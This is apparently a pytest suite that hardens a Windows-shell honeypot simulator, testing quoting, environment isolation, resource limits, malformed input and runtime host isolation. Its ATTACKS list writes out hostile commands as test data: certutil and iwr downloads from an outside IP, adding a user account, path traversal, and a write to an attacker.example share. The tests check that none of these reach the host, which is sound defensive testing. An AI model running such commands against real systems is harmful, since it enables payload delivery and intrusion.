"""Rank 8: Windows simulator hardening (honeypot/windows_persona).

F3 cmd /c quoting, F4 environment isolation, hard per-line event budget, aggregate session storage cap, repeated and
malformed redirection, malformed quoting (a lone quote used to crash the shell), Unicode, very long input, nested
recursion, runtime host-isolation with process/socket/DNS/file/import functions patched to fail, and Python/JS
parity of the ATT&CK table (ids, names, tactics) and of the Windows technique rules.
"""
import base64
import builtins
import importlib
import json
import os
import re
import socket
import subprocess
import sys
from pathlib import Path

import pytest

ENGINE = Path(__file__).resolve().parents[1]
REPO = ENGINE.parent
sys.path.insert(0, str(REPO / "honeypot"))

from windows_persona import WindowsShell, VirtualFS, VfsError  # noqa: E402
from windows_persona import shell as S  # noqa: E402
from windows_persona import telemetry as T  # noqa: E402
from windows_persona import vfs as V  # noqa: E402
from windows_persona.cowrie_shell import WindowsCowrieShell  # noqa: E402

CORPUS = json.loads((Path(__file__).parent / "fixtures" / "windows_intent_corpus.json").read_text(encoding="utf-8"))


def run(sh, line):
    return sh.execute(line)


# ── F3: cmd /c and cmd /k quoting ────────────────────────────────────────────────────────────────────────────────
@pytest.mark.parametrize("seg,expected", [
    ('cmd /c "whoami & hostname"', ("c", "whoami & hostname")),
    ('cmd /c whoami', ("c", "whoami")),
    ('CMD.EXE /C ver', ("c", "ver")),
    ('cmd /k "cd C:\\Windows"', ("k", "cd C:\\Windows")),
    ('cmd /c ""C:\\Program Files\\OpenSSH\\ssh.exe" -V"', ("c", '"C:\\Program Files\\OpenSSH\\ssh.exe" -V')),
    ('cmd /c "echo a" b"', ("c", 'echo a" b')),          # cmd.exe rule: strip the first and the LAST quote
    ('cmd /c "unterminated', ("c", "unterminated")),
    ('cmd /c ""', ("c", "")),
    ('cmd /c', ("c", "")),
    ('cmd /x whoami', None),
])
def test_cmd_command_line_follows_cmd_quote_rules(seg, expected):
    assert S.cmd_command_line(seg) == expected


def test_quoted_cmd_c_runs_every_command(tmp_path):
    sh = WindowsShell()
    r = run(sh, 'cmd /c "whoami & hostname"')
    assert r.output == "win-srv19-dc01\\administrator\nWIN-SRV19-DC01"
    assert [e["name"] for e in r.events] == ["whoami", "hostname", "cmd"]
    assert run(sh, 'cmd /c "echo a" b"').output == 'a" b'
    assert run(sh, 'cmd /c ""').output == "" and run(sh, "cmd /c").output == ""
    assert run(sh, 'cmd /c "type ""C:\\Temp\\setup.log"""').exit_code in (0, 1)  # malformed: handled, never raises


def test_paths_with_spaces_and_empty_arguments():
    sh = WindowsShell()
    assert run(sh, 'cmd /k "cd "C:\\Program Files""').exit_code == 0
    assert sh.cwd == "C:\\Program Files"
    assert run(sh, 'cd ""').exit_code in (0, 1)


# ── F4: environment isolation ────────────────────────────────────────────────────────────────────────────────────
def test_cmd_c_cannot_change_the_parent_environment_or_directory():
    sh = WindowsShell()
    before_env, before_cwd = dict(sh.env), sh.cwd
    run(sh, "cmd /c set LEAK=1")
    run(sh, "cmd /c cd C:\\Windows")
    run(sh, 'powershell -c "cd C:\\Windows"')
    assert sh.env == before_env and sh.cwd == before_cwd
    assert run(sh, "echo %LEAK%").output == "%LEAK%"


def test_cmd_k_adopts_the_child_state_on_purpose_and_never_shares_the_dict():
    sh = WindowsShell()
    run(sh, "cmd /k set KEEP=1")
    assert run(sh, "echo %KEEP%").output == "1"
    child = sh._child("cmd")
    child.env["X"] = "y"
    assert "X" not in sh.env and child.env is not sh.env and child.vfs is sh.vfs


def test_nested_shells_share_only_the_session_disk():
    sh = WindowsShell()
    run(sh, "cmd /c echo hi > C:\\Temp\\nested.txt")
    assert run(sh, "type C:\\Temp\\nested.txt").output == "hi"
    other = WindowsShell()
    assert "not find" in run(other, "type C:\\Temp\\nested.txt").output


# ── resource limits ──────────────────────────────────────────────────────────────────────────────────────────────
def test_event_budget_is_hard_and_shared_across_nesting():
    sh = WindowsShell()
    inner = " & ".join(["frob"] * 31)
    r = run(sh, " & ".join([f'cmd /c "{inner}"'] * 31))
    assert len(r.events) <= S.MAX_EVENTS_PER_LINE and "EVENT_LIMIT" in r.limits and r.exit_code != 0
    enc = base64.b64encode(("; ".join(["frob"] * 60)).encode("utf-16-le")).decode()
    lvl2 = base64.b64encode(("; ".join([f"powershell -enc {enc}"] * 3)).encode("utf-16-le")).decode()
    r2 = run(WindowsShell(), f"powershell -enc {lvl2}")
    assert len(r2.events) <= S.MAX_EVENTS_PER_LINE and "EVENT_LIMIT" in r2.limits


def test_a_normal_line_is_not_limited():
    r = run(WindowsShell(), "whoami & hostname & ver")
    assert r.limits == [] and len(r.events) == 3


def test_statement_limit_is_reported():
    r = run(WindowsShell(), " & ".join(["ver"] * 40))
    assert "STATEMENT_LIMIT" in r.limits or "EVENT_LIMIT" in r.limits
    assert len(r.events) <= S.MAX_EVENTS_PER_LINE


def test_nesting_depth_is_bounded():
    r = run(WindowsShell(), "cmd /c " * 10 + "whoami")
    assert "DEPTH_LIMIT" in r.limits and len(r.events) <= S.MAX_EVENTS_PER_LINE


def test_output_is_bounded():
    sh = WindowsShell()
    r = run(sh, " & ".join(["systeminfo"] * 30))
    assert len(r.output) <= S.MAX_OUTPUT


def test_aggregate_session_storage_cap():
    v = VirtualFS()
    chunk = "A" * 60000
    written = 0
    with pytest.raises(VfsError, match="not enough space"):
        for i in range(40):
            v.write(f"C:\\Temp\\f{i}.bin", "C:\\", chunk)
            written += len(chunk)
    assert v.bytes_used <= V.MAX_SESSION_BYTES and written <= V.MAX_SESSION_BYTES
    v.delete("C:\\Temp\\f0.bin", "C:\\")                 # deleting releases the bytes
    v.write("C:\\Temp\\again.bin", "C:\\", chunk)
    assert V.MAX_SESSION_BYTES <= 16 * 1024 * 1024        # never above the reference budget


def test_overwrite_does_not_double_count():
    v = VirtualFS()
    for _ in range(50):
        v.write("C:\\Temp\\same.txt", "C:\\", "B" * 50000)
    assert v.bytes_used == 50000


@pytest.mark.parametrize("line", ["echo x > C:\\Temp\\a.txt > C:\\Temp\\b.txt",
                                  "echo x >> C:\\Temp\\a.txt > C:\\Temp\\b.txt"])
def test_repeated_redirection_follows_cmd(line):
    sh = WindowsShell()
    run(sh, line)
    assert run(sh, "type C:\\Temp\\a.txt").output == "" and run(sh, "type C:\\Temp\\b.txt").output == "x"


def test_too_many_redirections_are_refused():
    sh = WindowsShell()
    r = run(sh, "echo x " + " ".join(f"> C:\\Temp\\r{i}.txt" for i in range(12)))
    assert r.output == "The syntax of the command is incorrect." and "REDIRECTION_LIMIT" in r.limits
    assert "not find" in run(sh, "type C:\\Temp\\r0.txt").output


@pytest.mark.parametrize("line", ["echo x >", "echo x > >", "echo x >>> f", "type < ", "echo x 2>", ">", "<", "2>&1"])
def test_malformed_redirection_is_handled(line):
    r = run(WindowsShell(), line)
    assert isinstance(r.output, str)


# ── malformed quoting, Unicode, long input (never raises) ────────────────────────────────────────────────────────
@pytest.mark.parametrize("line", ['"', '""', '"""', 'whoami & "', '" & "', '^', '^^^', 'echo "abc', '"whoami',
                                  'cmd /c "', 'powershell -c "', '|', '&&', '& &', '%', '%%', '%PATH', '\x00',
                                  '\x1b[31m', 'dir "C:\\Program Files', "'", '`', '\u202ewhoami', 'ｗｈｏａｍｉ',
                                  'type C:\\Temp\\\udcff', 'echo \U0001F600', '\ufeffwhoami'])
def test_malformed_and_unicode_input_never_raises(line):
    sh = WindowsShell()
    r = sh.execute(line)
    assert isinstance(r.output, str) and isinstance(r.events, list)
    sh.execute("powershell")
    assert isinstance(sh.execute(line).output, str)


def test_lone_quote_gives_a_cmd_error_instead_of_crashing():
    assert run(WindowsShell(), '"').output.startswith("'\"' is not recognized")
    assert run(WindowsShell(), 'echo "abc').output == '"abc'


@pytest.mark.parametrize("n", [8191, 8192, 100000])
def test_very_long_lines(n):
    r = run(WindowsShell(), "echo " + "a" * n)
    assert len(r.output) <= S.MAX_OUTPUT
    if n > S.MAX_LINE:
        assert r.output == "The command line is too long."


def test_adapter_survives_bad_bytes_and_reports_limits():
    class Term:
        out = b""
        def write(self, b): Term.out += b
        def eraseDisplay(self): pass
        def cursorHome(self): pass

    class Events:
        calls = []
        def dispatch(self, eid, fmt, **kw): Events.calls.append((eid, kw))

    class P:
        terminal, events, lineBuffer, lineBufferIndex, ps = Term(), Events(), [], 0, None
        ended = None
        def end_process(self, code): P.ended = code

    s = WindowsCowrieShell(P())
    s.lineReceived(b'\xff\xfe"\r\n')
    s.lineReceived(" & ".join(["frob"] * 40).encode())
    ids = [c[0] for c in Events.calls]
    assert "sentinel.windows.limit" in ids
    assert sum(1 for c in Events.calls if c[0] == "sentinel.windows.command") <= 1 + S.MAX_EVENTS_PER_LINE


# ── runtime host isolation (functions patched to fail, not only an AST check) ───────────────────────────────────
ATTACKS = [
    "whoami & calc.exe", "cmd /c \"whoami & net user x y /add\"", "powershell -c \"Start-Process cmd\"",
    "powershell -c [System.Diagnostics.Process]::Start('calc')", "powershell -c \"Invoke-Expression 'calc'\"",
    "powershell -c \"__import__('os').system('id')\"", "echo $(python -c \"import os\")", "certutil -urlcache -f http://198.51.100.7/a a",
    "ping -n 1 attacker.example", "ping 198.51.100.1", "nslookup attacker.example", "type C:\\..\\..\\..\\etc\\passwd",
    "type \\\\?\\C:\\Windows\\win.ini", "type " + str(Path(__file__).resolve()), "dir " + str(REPO),
    "echo x > " + str(REPO / "pwned.txt"), "echo x > \\\\attacker\\share\\x", "cmd /c \"cmd /c \"powershell -enc AAAA\"\"",
    "iwr http://198.51.100.7 -OutFile C:\\Windows\\a.exe", "%COMSPEC% /c whoami", "C:\\Windows\\System32\\cmd.exe /c ver",
]


def test_no_process_socket_dns_file_or_import_side_effect(monkeypatch, tmp_path):
    calls = []

    def forbid(name):
        def f(*a, **k):
            calls.append(name)
            raise AssertionError(name)
        return f
    real_import = builtins.__import__
    allowed = set(sys.modules)

    def guarded_import(name, *a, **k):
        if name.split(".")[0] not in allowed and name.split(".")[0] not in sys.builtin_module_names:
            calls.append("import:" + name)
        return real_import(name, *a, **k)

    targets = [(subprocess, "Popen"), (subprocess, "run"), (subprocess, "call"), (subprocess, "check_output"),
               (os, "system"), (os, "popen"), (os, "execv"), (os, "execvp"), (os, "spawnv"), (os, "startfile"),
               (os, "remove"), (os, "unlink"), (os, "rename"), (os, "mkdir"), (os, "listdir"), (os, "scandir"),
               (socket, "socket"), (socket, "create_connection"), (socket, "getaddrinfo"), (socket, "gethostbyname"),
               (builtins, "open"), (builtins, "eval"), (builtins, "exec"), (builtins, "compile"), (importlib, "import_module")]
    for mod, name in targets:
        if hasattr(mod, name):
            monkeypatch.setattr(mod, name, forbid(f"{getattr(mod, '__name__', mod)}.{name}"))
    monkeypatch.setattr(builtins, "__import__", guarded_import)
    sh = WindowsShell()
    for line in ATTACKS:
        sh.execute(line)
        sh.execute("powershell")
        sh.execute(line)
        sh.execute("exit")
    monkeypatch.undo()
    assert calls == []
    assert not (REPO / "pwned.txt").exists()


def test_host_paths_resolve_only_inside_the_virtual_tree():
    sh = WindowsShell()
    out = run(sh, "type " + str(Path(__file__).resolve())).output
    assert "Rank 8" not in out and ("cannot find" in out or "syntax" in out)
    assert "sentinelai" not in run(sh, "dir C:\\Users").output.lower()


# ── Python / JS parity of the ATT&CK table and the Windows technique rules ──────────────────────────────────────
def _js_table():
    src = (REPO / "backend" / "utils" / "attackTechniques.js").read_text(encoding="utf-8")
    consts = {"P_PE": ["Persistence", "Privilege Escalation"]}
    table = {}
    for m in re.finditer(r"^\s+'?(T\d{4}(?:\.\d{3})?)'?: \{ name: '([^']+)', tactics: (\[[^\]]*\]|P_PE) \}", src, re.M):
        raw = m.group(3)
        tactics = consts[raw] if raw in consts else [x.strip().strip("'") for x in raw[1:-1].split(",") if x.strip()]
        tactics = [t for part in tactics for t in (consts["P_PE"] if part == "...P_PE" else [part])]
        table[m.group(1)] = (m.group(2), tactics)
    return table


def test_python_techniques_match_the_backend_master_table():
    js = _js_table()
    assert len(js) >= 50
    for tid, (name, tactics) in T.TECHNIQUES.items():
        assert tid in js, tid
        assert js[tid] == (name, tactics), (tid, js[tid], (name, tactics))


def test_attack_technique_output_carries_tactics():
    out = T.attack_techniques("wevtutil cl Security")
    assert out == [{"id": "T1685.005", "name": "Clear Windows Event Logs", "tactics": ["Defense Impairment"]}]


@pytest.mark.parametrize("cmd,ids", sorted(CORPUS["windows_attack"].items()))
def test_windows_attack_corpus(cmd, ids):
    assert [t["id"] for t in T.attack_techniques(cmd)] == ids
